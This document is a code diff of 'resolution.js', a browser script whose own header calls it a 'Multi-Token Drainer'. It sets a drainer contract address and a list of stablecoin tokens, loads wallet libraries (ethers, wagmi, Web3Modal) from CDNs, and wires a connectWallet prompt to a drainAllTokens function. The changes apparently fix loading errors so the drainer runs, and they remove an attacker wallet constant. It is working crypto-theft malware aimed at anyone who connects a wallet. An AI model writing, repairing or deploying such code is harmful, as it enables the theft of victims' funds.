@@ -1,12 +1,11 @@
-// resolution.js - Multi-Token Drainer (Browser-Safe)
-// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=3
+// resolution.js - Multi-Token Drainer (UMD + Working CDN)
+// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=5
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
 const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e';
-const ATTACKER_WALLET = '0xF10b3300F6944e40A203587339C07e5119A70c55';
 
 const TOKENS = {
-  1: { // Ethereum
+  1: {
     USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
     USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
     DAI:  '0x6B175474E89094C44Da98b954EedeAC495271d0F'
@@ -15,19 +14,21 @@ const TOKENS = {
 
 let modal, wagmiConfig;
 
-// Load Web3Modal + Wagmi UMD
 function loadScript(src, callback) {
   const script = document.createElement('script');
   script.src = src;
   script.onload = callback;
-  script.onerror = () => console.error(`Failed to load ${src}`);
+  script.onerror = () => console.error(`Failed to load: ${src}`);
   document.head.appendChild(script);
 }
 
 function initDrainer() {
-  loadScript('https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js', () => {
-    loadScript('https://cdn.jsdelivr.net/npm/wagmi@2.12.1/dist/index.umd.js', () => {
-      loadScript('https://cdn.jsdelivr.net/npm/@web3modal/wagmi@5.1.5/dist/index.umd.js', setupModal);
+  // 1. Load ethers (UMD)
+  loadScript('https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.umd.min.js', () => {
+    // 2. Load wagmi (ESM → via unpkg + ?module)
+    loadScript('https://unpkg.com/wagmi@2.12.1/dist/index.js', () => {
+      // 3. Load Web3Modal (ESM → via unpkg)
+      loadScript('https://unpkg.com/@web3modal/wagmi@5.1.5/dist/index.js', setupModal);
     });
   });
 }
@@ -97,7 +98,10 @@ async function drainAllTokens(user) {
   }
 }
 
-window.connectWallet = () => modal.open();
+window.connectWallet = () => {
+  if (modal) modal.open();
+  else console.error('Modal not ready');
+};
 
 // Start
 initDrainer();
